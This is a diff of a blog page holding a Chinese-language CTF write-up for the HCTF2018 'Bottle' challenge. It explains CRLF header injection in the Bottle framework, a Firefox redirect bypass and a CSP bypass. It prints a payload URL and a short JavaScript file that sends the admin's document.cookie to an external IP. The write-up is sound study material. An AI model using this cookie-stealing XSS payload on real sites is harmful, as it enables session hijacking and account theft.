@@ -20,7 +20,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"srpopty.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"srpopty.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="HCTF2018 bottle writeup.">
@@ -113,6 +113,7 @@
 
   <div class="site-nav-right">
     <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
 </div>
@@ -124,6 +125,26 @@
         <li class="menu-item menu-item-home">
 
     <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-knowledge">
+
+    <a href="/knowledge/" rel="section"><i class="fa fa-fw fa-book"></i>知识库</a>
+
+  </li>
+        <li class="menu-item menu-item-life">
+
+    <a href="/life/" rel="section"><i class="fa fa-fw fa-rocket"></i>随想</a>
+
+  </li>
+        <li class="menu-item menu-item-ctf">
+
+    <a href="/ctf/" rel="section"><i class="fa fa-fw fa-flag"></i>ctf</a>
+
+  </li>
+        <li class="menu-item menu-item-vulnerabilities">
+
+    <a href="/vulnerabilities/" rel="section"><i class="fa fa-fw fa-eye"></i>漏洞</a>
 
   </li>
         <li class="menu-item menu-item-tags">
@@ -141,9 +162,44 @@
     <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
 
   </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
   </ul>
 
 </nav>
+  <div class="site-search">
+    <div class="search-pop-overlay">
+  <div class="popup search-popup">
+      <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+  </div>
+</div>
+
+  </div>
 </div>
     </header>
 
@@ -215,30 +271,33 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="Bottle"><a href="#Bottle" class="headerlink" title="Bottle"></a>Bottle</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Not hard, I believe you are the lucky one!</span><br><span class="line">hint1: */3 */10 </span><br><span class="line">hint2: bot use firefoxDriver</span><br><span class="line">URL http://bottle.2018.hctf.io</span><br></pre></td></tr></table></figure>
+        <h1 id="Bottle"><a href="#Bottle" class="headerlink" title="Bottle"></a>Bottle</h1><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Not hard, I believe you are the lucky one!</span><br><span class="line">hint1: */3 */10 </span><br><span class="line">hint2: bot use firefoxDriver</span><br><span class="line">URL http://bottle.2018.hctf.io</span><br></pre></td></tr></table></figure>
 
-<p>后端是个 python，根据题目可知这个应用使用了 bottle 框架开发。应用功能是提交一个网址，但是经过测试发现不管提交什么网址都没有任何反应，目测可能只能提交本域名下的网址。</p>
-<p>登录与注册的时候发现中间经过了一个 path 跳转<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/4V@3FC@51J0E9XXG-1024x269.png"></p>
-<p>bottle 框架比较出名一点的漏洞是 HTTP 头注入漏洞 (CVE-2016-9964)<br>![](/HCTF2018-Bottle-Writeup/TIM 截图 20181112190926-1024x547.png)</p>
-<p>在 path 跳转时可进行 CRLF 注入<br>![](/HCTF2018-Bottle-Writeup/TIM 截图 20181112191129-1024x280.png)</p>
-<p>所以思路是利用 CRLF 注入，将 XSS 内容写入到 body 中，将这个网址提交给管理员，管理员访问这个网址，触发 XSS 达到 cookie</p>
-<p>这里有一个问题：当浏览器发现 Location 可以跳转时，将不会对 body 中的 HTML 进行渲染而直接跳转，只有 Location 为空时才不会跳转。但是此题中 Location 又不能为空 (会 500)，因此当管理员访问这个网址时肯定会跳转。不过 Hint 中提到 “bot use firefoxDriver”，而在 FireFox 中，当 Location 目标网址的端口小于 80 时不会对 Location 跳转</p>
-<p>因此构造网址如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle.2018.hctf.io:0/%0A%0D%0A%0D%3Cscript%3Ea=1%3C/script%3E</span><br></pre></td></tr></table></figure>
+<p> 后端是个 python，根据题目可知这个应用使用了 bottle 框架开发。应用功能是提交一个网址，但是经过测试发现不管提交什么网址都没有任何反应，目测可能只能提交本域名下的网址。</p>
+<p> 登录与注册的时候发现中间经过了一个 path 跳转 </p>
+<p><img src="/2018/11/12/HCTF2018-Bottle-Writeup/4V@3FC@51J0E9XXG-1024x269.png"></p>
+<p>bottle 框架比较出名一点的漏洞是 HTTP 头注入漏洞 (CVE-2016-9964)</p>
+<p>![](/HCTF2018-Bottle-Writeup/TIM 截图 20181112190926-1024x547.png)</p>
+<p> 在 path 跳转时可进行 CRLF 注入 </p>
+<p>![](/HCTF2018-Bottle-Writeup/TIM 截图 20181112191129-1024x280.png)</p>
+<p> 所以思路是利用 CRLF 注入，将 XSS 内容写入到 body 中，将这个网址提交给管理员，管理员访问这个网址，触发 XSS 达到 cookie</p>
+<p> 这里有一个问题：当浏览器发现 Location 可以跳转时，将不会对 body 中的 HTML 进行渲染而直接跳转，只有 Location 为空时才不会跳转。但是此题中 Location 又不能为空 (会 500)，因此当管理员访问这个网址时肯定会跳转。不过 Hint 中提到 “bot use firefoxDriver”，而在 FireFox 中，当 Location 目标网址的端口小于 80 时不会对 Location 跳转，因此构造网址 </p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle.2018.hctf.io:0/%0A%0D%0A%0D%3Cscript%3Ea=1%3C/script%3E</span><br></pre></td></tr></table></figure>
 
-<p>注意到题目中还设置了 CSP</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure>
-<p>后来出题人再修复此题之后将 CSP 放在了 CRLF 注入点的下面，这样就可以直接把 CSP 挤到 body 中，浏览器便不会解析 CSP</p>
-<p>在本地 FireFox 中测试 <br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/U5Z7A0TGDGISN5ZXKH_J.png"><br> 这里不使用 alert 测试是因为当 URL 中存在引号或括号时会 500</p>
-<p>于是将 script 的 src 指向自己服务器的 js 文件即可任意 XSS，最终 payload 如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:0/%0A%0D%0A%0D%3Cscript+src=http://srpopty.cn/1.js%3E%3C/script%3E</span><br></pre></td></tr></table></figure>
+<p> 注意到题目中还设置了 CSP<code>Content-Security-Policy: default-src&#39;self&#39;; script-src&#39;self&#39;</code>，后来出题人再修复此题之后将 CSP 放在了 CRLF 注入点的下面，这样就可以直接把 CSP 挤到 body 中，浏览器便不会解析 CSP。在本地 FireFox 中测试：</p>
+<p><img src="/2018/11/12/HCTF2018-Bottle-Writeup/U5Z7A0TGDGISN5ZXKH_J.png"></p>
+<p> 这里不使用 alert 测试是因为当 URL 中存在引号或括号时会 500，于是将 script 的 src 指向自己服务器的 js 文件即可任意 XSS，最终 payload 如下 </p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:0/%0A%0D%0A%0D%3Cscript+src=http://srpopty.cn/1.js%3E%3C/script%3E</span><br></pre></td></tr></table></figure>
 
 <p>1.js</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ajax=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">ajax.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://123.206.86.208/xss/&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>,<span class="literal">true</span>);</span><br><span class="line">ajax.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">ajax.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure>
 
-<p>拿到管理员的 cookie<br>![](/HCTF2018-Bottle-Writeup/TIM 截图 20181112193243.png)</p>
-<p>修改 cookie 登录拿到 flag<br>![](/HCTF2018-Bottle-Writeup/TIM 截图 20181112193331-1024x384.png)</p>
-<h1 id="参考"><a href="# 参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p>
+<p> 拿到管理员的 cookie</p>
+<p>![](/HCTF2018-Bottle-Writeup/TIM 截图 20181112193243.png)</p>
+<p> 修改 cookie 登录拿到 flag</p>
+<p>![](/HCTF2018-Bottle-Writeup/TIM 截图 20181112193331-1024x384.png)</p>
+<hr>
+<h2 id="参考"><a href="# 参考" class="headerlink" title="参考"></a> 参考 </h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p>
 
     </div>
 
@@ -324,7 +383,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Bottle"><span class="nav-number">1.</span> <span class="nav-text">Bottle</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">2.</span> <span class="nav-text">参考</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Bottle"><span class="nav-number">1.</span> <span class="nav-text">Bottle</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.1.</span> <span class="nav-text"> 参考 </span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -338,20 +397,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-count">36</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -427,6 +486,10 @@
   
 
 
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
